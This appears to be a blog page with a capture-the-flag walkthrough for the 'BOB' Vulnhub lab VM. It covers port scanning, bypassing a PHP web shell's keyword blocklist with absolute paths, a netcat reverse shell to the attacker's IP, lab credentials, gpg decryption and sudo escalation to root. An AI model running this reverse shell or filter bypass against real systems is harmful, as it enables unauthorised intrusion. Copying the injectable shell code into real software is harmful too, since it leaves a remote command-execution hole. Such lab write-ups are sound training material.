@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="map[]" />
+    <script type="text/javascript"> var _iub = _iub || []; _iub.csConfiguration = {"lang":"en","siteId":1309409,"consentOnScroll":false,"enableRemoteConsent":true,"cookiePolicyId":71698487}; </script><script type="text/javascript" src="//cdn.iubenda.com/cookie_solution/safemode/iubenda_cs.js" charset="UTF-8" async></script> 
+    
+    <link rel="shortcut icon" type="image/x-icon" href="https://oliverhough.cloud/img/favicon.ico">
+    <title>Bob C0rruptedb1t</title>
+    <meta name="generator" content="Hugo 0.36" />
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="https://oliverhough.cloud/css/main.css" />
+    <link rel="stylesheet" type="text/css" href="https://oliverhough.cloud//css/fork-awesome.min.css" />
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,400,200bold,400old" />
+    
+    <!--[if lt IE 9]>
+			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+		<![endif]-->
+
+    
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-120604141-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+    
+  </head>
+
+  <body>
+    <div id="wrap">
+
+      
+      <nav class="navbar navbar-default">
+  <div class="container">
+    <div class="navbar-header">
+      <a class="navbar-brand" href="https://oliverhough.cloud/"><i class="fa fa-home"></i></a>
+    </div>
+    <div id="navbar">
+      <ul class="nav navbar-nav navbar-right">
+      
+        
+        <li><a href="/blog/">BLOG</a></li>
+        
+        <li><a href="/public_key.txt">PGP KEY</a></li>
+        
+        <li><a href="https://www.amazon.es/hz/wishlist/ls/1CN11PEWFIXSJ">AMAZON WISHLIST</a></li>
+        
+        <li><a href="https://www.patreon.com/olihough86">PATREON</a></li>
+        
+        <li><a href="/writeups/">WRITEUPS</a></li>
+        
+      
+      </ul>
+    </div>
+  </div>
+</nav>
+
+      
+      <div class="container">
+        <div class="blog-post">
+          <h3>
+            <strong><a href="https://oliverhough.cloud/writeups/bob-c0rruptedb1t/">Bob C0rruptedb1t</a></strong>
+          </h3>
+        </div>
+        <div class="blog-title">
+          <h4>
+          July 10, 2018
+            &nbsp;&nbsp;
+            
+          </h4>
+        </div>
+        <div class="panel panel-default">
+          <div class="panel-body">
+            <div class="blogpost">
+              
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Today we are going to look at how I solved the BOB Boot2Root from C0rruptedb1t / Vulnhub. This is a fairly simple challenge as far as skill goes but it requires strong logic and problem solving skills. You really need to think outside the box with this one. I have chosen the VM from the c0rruptedb1t website as it appears to be the most up to date version.</p>
+
+<h2 id="vm-info">VM Info</h2>
+
+<p>Name: BOB
+Author: <a href="http://c0rruptedb1t.ddns.net">c0rruptedb1t</a><br />
+Link: <a href="http://c0rruptedb1t.ddns.net/vms/bob.html">http://c0rruptedb1t.ddns.net/vms/bob.html</a><br />
+Difficulty: Beginner<br />
+Networking: Host Only (192.168.21.130)</p>
+
+<h2 id="discovery">Discovery</h2>
+
+<p>First off we need to find the VM on our network. Since the BOB VM and my Kali VM are both connected via host only networking I know that they are both on the 192.168.21.0/24 range so I fire off a quick nmap ping only scan to see if anything responds.</p>
+
+<pre><code>nmap -sn 192.168.21.0/24
+</code></pre>
+
+<script src="https://asciinema.org/a/S5ZojoAznWbG9wjAY9hN5RiVb.js" data-rows="20" id="asciicast-S5ZojoAznWbG9wjAY9hN5RiVb" async></script>
+
+<p>Great I know that 192.168.21.129 is my Kali VM so 192.168.21.130 must be the BOB VM.<br />
+Lets take a look at what ports are open with an nmap port scan</p>
+
+<pre><code>nmap -v -sS -A -T4 --reason -oA target_syn --webxml -p- 192.168.21.130
+</code></pre>
+
+<p>Lets break this down so we know what&rsquo;s going on.</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Reason</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>-v</td>
+<td>Verbose output</td>
+</tr>
+
+<tr>
+<td>-sS</td>
+<td>TCP SYN scan</td>
+</tr>
+
+<tr>
+<td>-A</td>
+<td>Enable OS detection, version detection, script scanning, and traceroute</td>
+</tr>
+
+<tr>
+<td>-T4</td>
+<td>Aggressive scanning</td>
+</tr>
+
+<tr>
+<td>&ndash;reason</td>
+<td>Show host and port state reasons</td>
+</tr>
+
+<tr>
+<td>-oA target_syn</td>
+<td>All output formats and name the file target_syn</td>
+</tr>
+
+<tr>
+<td>&ndash;webxml</td>
+<td>Also generate a webxml report</td>
+</tr>
+
+<tr>
+<td>-p-</td>
+<td>Scan all TCP ports</td>
+</tr>
+</tbody>
+</table>
+
+<p>Once NMAP has finished doing its thing we will find target_syn.xml in our working directory along with the other output formats should we need them.</p>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>80</td>
+<td>Apache web server</td>
+</tr>
+
+<tr>
+<td>25468</td>
+<td>SSH</td>
+</tr>
+</tbody>
+</table>
+
+<p>We have 2 ports open. A webserver on port 80 and SSH on port 25468.<br />
+The report also tells us that a robots.txt was found with the following entries.</p>
+
+<ul>
+<li>/login.php (404)</li>
+<li>/dev_shell.php</li>
+</ul>
+
+<p><img src="/img/bobdevshell.png" alt="dev_shell" /></p>
+
+<ul>
+<li>/lat_memo.html</li>
+</ul>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">Memo sent at GMT+10:00 2:37:42 by User: Bob
+Hey guys IT here don&#39;t forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.
+
+-Bob</code></pre></div>
+
+<ul>
+<li>/passwords.html</li>
+</ul>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">Really who made this file at least get a hash of your password to display, hackers can&#39;t do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don&#39;t make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. &gt;:(
+-Bob </code></pre></div>
+
+<p>At this point we could try more content discovery, but it&rsquo;s looking like we have everything we need here to get our foothold in this machine.</p>
+
+<h2 id="initial-shell">Initial shell</h2>
+
+<p>After some playing around with the &lsquo;dev shell&rsquo; I noticed that if we type some commands such as nc, netcat and ls we are presented with the message &ldquo;Get out skid lol.&rdquo; This reflects the lat_memo.html that claims there is some kind of filter in place. The filter does appear to to have a flaw though as it does not take into account absolute paths, meaning we can bypass it with /bin/ls and get a directory listing returned.</p>
+
+<pre><code>WIP.jpg about.html contact.html dev_shell.php dev_shell.php.bak dev_shell_back.png index.html index.html.bak lat_memo.html login.html news.html passwords.html robots.txt school_badge.png 
+</code></pre>
+
+<p><em>dev_shell.php.bak</em><br />
+Brilliant they have left a backup of dev_shell.php that we can download and take a look at.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;html&gt;
+&lt;body&gt;
+  <span style="color:#ff79c6">&lt;?php</span>
+    <span style="color:#6272a4">//init
+</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">$invalid</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+    <span style="color:#8be9fd;font-style:italic">$command</span> <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;in_command&#39;</span>]);
+    <span style="color:#8be9fd;font-style:italic">$bad_words</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;pwd&#34;</span>, <span style="color:#f1fa8c">&#34;ls&#34;</span>, <span style="color:#f1fa8c">&#34;netcat&#34;</span>, <span style="color:#f1fa8c">&#34;ssh&#34;</span>, <span style="color:#f1fa8c">&#34;wget&#34;</span>, <span style="color:#f1fa8c">&#34;ping&#34;</span>, <span style="color:#f1fa8c">&#34;traceroute&#34;</span>, <span style="color:#f1fa8c">&#34;cat&#34;</span>, <span style="color:#f1fa8c">&#34;nc&#34;</span>);
+  <span style="color:#ff79c6">?&gt;</span>
+  &lt;style&gt;
+    #back{
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      z-index:-10
+    }
+      #shell{
+        color: white;
+        text-align: center;
+    }
+  &lt;/style&gt;
+  &lt;div id=&#34;shell&#34;&gt;
+    &lt;h2&gt;
+      dev_shell
+    &lt;/h2&gt;
+    &lt;form action=&#34;dev_shell.php&#34; method=&#34;post&#34;&gt;
+      Command: &lt;input type=&#34;text&#34; name=&#34;in_command&#34; /&gt; &lt;br&gt;
+      &lt;input type=&#34;submit&#34; value=&#34;submit&#34;&gt;
+    &lt;/form&gt;
+    &lt;br&gt;
+    &lt;h5&gt;Output:&lt;/h5&gt;
+    <span style="color:#ff79c6">&lt;?php</span>
+    system(<span style="color:#f1fa8c">&#34;running command...&#34;</span>);
+      <span style="color:#6272a4">//executes system Command
+</span><span style="color:#6272a4"></span>      <span style="color:#6272a4">//checks for sneaky ;
+</span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">if</span> (strpos(<span style="color:#8be9fd;font-style:italic">$command</span>, <span style="color:#f1fa8c">&#39;;&#39;</span>) <span style="color:#ff79c6">!==</span><span style="color:#ff79c6">false</span>){
+        system(<span style="color:#f1fa8c">&#34;echo Nice try skid, but you will never get through this bulletproof php code&#34;</span>); <span style="color:#6272a4">//doesn&#39;t work :P
+</span><span style="color:#6272a4"></span>      }
+      <span style="color:#ff79c6">else</span>{
+        <span style="color:#8be9fd;font-style:italic">$is_he_a_bad_man</span> <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#39; &#39;</span>, trim(<span style="color:#8be9fd;font-style:italic">$command</span>));
+        <span style="color:#6272a4">//checks for dangerous commands
+</span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (in_array(<span style="color:#8be9fd;font-style:italic">$is_he_a_bad_man</span>[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">$bad_words</span>)){
+          system(<span style="color:#f1fa8c">&#34;echo Get out skid lol&#34;</span>);
+        }
+        <span style="color:#ff79c6">else</span>{
+          system(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;in_command&#39;</span>]);
+        }
+      }
+    <span style="color:#ff79c6">?&gt;</span>
+  &lt;/div&gt;
+    &lt;img src=&#34;dev_shell_back.png&#34; id=&#34;back&#34; alt=&#34;&#34;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+
+<p>We can see from the PHP code that the list of bad words is pwd, ls, netcat, ssh, wget, ping, traceroute, cat, nc also if there is a semicolon ( ; ) anywhere in our command then it will also fail with the message &ldquo;echo Nice try skid, but you will never get through this bulletproof php code&rdquo;</p>
+
+<p>Knowing that we can bypass the filter by using an absolute path, we can use <code>which nc</code> to see if netcat exists on the machine and what is it&rsquo;s absolute path which is &lsquo;/bin/nc&rsquo; With this information we can build our command to get a simple netcat reverse shell. First of all we need to set up a listener on our Kali VM.</p>
+
+<pre><code>netcat -nvlp 4444
+</code></pre>
+
+<p>and then we can run our command in the PHP dev shell</p>
+
+<pre><code>/bin/nc -e /bin/bash 192.168.21.129 4444
+</code></pre>
+
+<script src="https://asciinema.org/a/Uwyx3L0QdnlZcCd3z9msYFa9q.js" id="asciicast-Uwyx3L0QdnlZcCd3z9msYFa9q" async></script>
+
+<p>In the asciicast you&rsquo;ll see I ran <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> this upgrades us to a tty(ish) bash shell rather than the dumb netcat shell we get initially.</p>
+
+<h2 id="getting-the-ssh-logins">Getting The SSH Logins</h2>
+
+<p>Now we have our shell we can go exploring, there are a lot of random files laying around in the users home directories, bob is the boss so it&rsquo;s most likely that getting the bob account will lead to root, lets start with his home folder.<br />
+After some rummaging around we find some interesting files</p>
+
+<ul>
+<li>/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh</li>
+</ul>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#ff79c6">#!/bin/bash
+</span><span style="color:#ff79c6"></span>clear
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;-= Notes =-&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Harry Potter is my faviorite&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Are you the real me?&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Right, I&#39;m ordering pizza this is going nowhere&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;People just don&#39;t get me&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Cucumber&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Rest now your eyes are sleepy&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Are you gonna stop reading this yet?&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Time to fix the server&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Everyone is annoying&#34;</span>
+<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Sticky notes gotta buy em&#34;</span></code></pre></div>
+
+<ul>
+<li>/home/bob/.old_passwordfile.html</li>
+</ul>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">html</span>&gt;
+&lt;<span style="color:#ff79c6">p</span>&gt;
+jc:Qwerty
+seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
+&lt;/<span style="color:#ff79c6">p</span>&gt;
+&lt;/<span style="color:#ff79c6">html</span>&gt;</code></pre></div>
+
+<ul>
+<li>/home/bob/Documents/login.txt.gpg (ENCRYPTED)</li>
+<li>/home/bob/Documents/staff.txt</li>
+</ul>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">Seb:
+
+Seems to like Elliot
+Wants to do well at his job
+Gave me a backdoored FTP to instal that apparently Elliot gave him
+
+James:
+
+Does nothing
+Pretty Lazy
+Doesn&#39;t give a shit about his job
+
+Elliot:
+
+Keeps to himself
+Always needs to challenge everything I do
+Keep an eye on him
+Try and get him fired</code></pre></div>
+
+<p>.old_passwordfile.html contains 2 SSH logins, great, lets log in as the regular user &lsquo;jc&rsquo; with password &lsquo;Qwerty&rsquo;</p>
+
+<h2 id="long-story-short">Long Story Short</h2>
+
+<p>I&rsquo;ll admit here is where I got stuck so I ended up Googling for a hint. I read that taking the first letter from each line of the notes.sh file will give us the password for the login.txt.gpg file. To be honest I probably would never have got to that in a million years. Anyway let&rsquo;s continue down that path, with the password HARPOCRATES</p>
+
+<pre><code>gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
+</code></pre>
+
+<p>OK! We have bob&rsquo;s password <code>b0bcat_</code> so we can su to become bob.</p>
+
+<p>Now we are bob we run <code>ìd</code> and can see he is in the sudo group so we can <code>sudo -s</code> and again enter bob&rsquo;s password to become root.</p>
+
+<p>All that is left is to <code>cat /flag.txt</code> and we are done!</p>
+
+<script src="https://asciinema.org/a/tMBaTn5KwnhxwOUJcugZ9EjAX.js" id="asciicast-tMBaTn5KwnhxwOUJcugZ9EjAX" async></script>
+
+              <hr>
+              <div class="related-posts">
+                <h5>Related Posts</h5>
+                
+              </div>
+            </div>
+          </div>
+          <hr>
+        </div>
+      </div>
+      
+    </div>
+
+    
+    <footer>
+  <div id="footer">
+    <div class="container">
+      <p class="text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io/">Hugo</a> and
+      <a href="http://www.github.com/nurlansu/hugo-sustain/">sustain</a> with ♥</p>
+      <a href="https://www.iubenda.com/privacy-policy/71698487" class="iubenda-white iubenda-embed " title="Privacy Policy">Privacy Policy</a> <script type="text/javascript">(function (w,d) {var loader = function () {var s = d.createElement("script"), tag = d.getElementsByTagName("script")[0]; s.src="https://cdn.iubenda.com/iubenda.js"; tag.parentNode.insertBefore(s,tag);}; if(w.addEventListener){w.addEventListener("load", loader, false);}else if(w.attachEvent){w.attachEvent("onload", loader);}else{w.onload = loader;}})(window, document);</script> <a href="https://www.iubenda.com/privacy-policy/71698487/cookie-policy" class="iubenda-white iubenda-embed " title="Cookie Policy">Cookie Policy</a> <script type="text/javascript">(function (w,d) {var loader = function () {var s = d.createElement("script"), tag = d.getElementsByTagName("script")[0]; s.src="https://cdn.iubenda.com/iubenda.js"; tag.parentNode.insertBefore(s,tag);}; if(w.addEventListener){w.addEventListener("load", loader, false);}else if(w.attachEvent){w.attachEvent("onload", loader);}else{w.onload = loader;}})(window, document);</script> 
+    </div>
+  </div>
+</footer>
+<div class="footer"></div>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://oliverhough.cloud/js/docs.min.js"></script>
+<script src="https://oliverhough.cloud/js/main.js"></script>
+
+<script src="https://oliverhough.cloud/js/ie10-viewport-bug-workaround.js"></script>
+
+
+    
+  </body>
+</html>
